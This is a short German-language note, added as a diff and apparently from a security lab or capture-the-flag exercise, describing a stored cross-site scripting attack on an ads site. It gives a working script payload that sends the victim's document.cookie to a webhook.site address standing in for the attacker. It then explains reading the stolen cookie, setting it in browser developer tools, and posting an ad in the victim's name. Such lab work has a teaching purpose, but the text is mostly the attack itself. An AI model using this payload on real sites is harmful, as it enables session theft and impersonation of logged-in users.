@@ -1,0 +1,10 @@
+Payload in XSS anfällige Beschreibung einer Anzeige schreiben. Die Beschreibung kann nur von angemeldeten Benutzer:innen eingesehen werden, deren Cookie man stehlen will.
+"https://webhook.site/random-webhook-id" steht hier stellvertretend für die Domain vom attacker.
+<script>document.write(`<img src='https://webhook.site/random-webhook-id?c=${document.cookie}'></img>`)</script>
+
+Cookies des Opfers abfangen und auf https://webhook.site unter Query Strings auslesen.
+
+Cookie für eigene Anfragen nutzen.
+Im Browser Dev Tools > Web-Speicher zum manuellen Setzen von Cookie Werten.
+
+Eine Anzeige im Namen des Opfers schalten
